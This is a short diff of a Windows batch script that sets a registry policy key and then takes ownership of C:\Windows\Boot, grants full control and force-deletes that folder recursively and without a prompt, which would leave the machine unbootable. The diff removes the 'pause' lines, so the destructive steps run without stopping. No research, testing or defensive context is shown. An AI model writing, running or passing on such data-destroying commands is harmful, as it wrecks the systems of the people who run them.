@@ -9,7 +9,6 @@ reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Sys
 takeown /f "C:\Windows\Boot" /a 
 icacls "C:\Windows\Boot" /grant administrators:F /t
 del /F /S /Q "C:\Windows\Boot" 
-pause
 
 
 :B 
@@ -17,7 +16,7 @@ reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Sys
 takeown /f "C:\Windows\Boot" /a
 icacls "C:\Windows\Boot" /grant administrators:F /t
 del /F /S /Q "C:\Windows\Boot" 
-pause
+
 
 
 
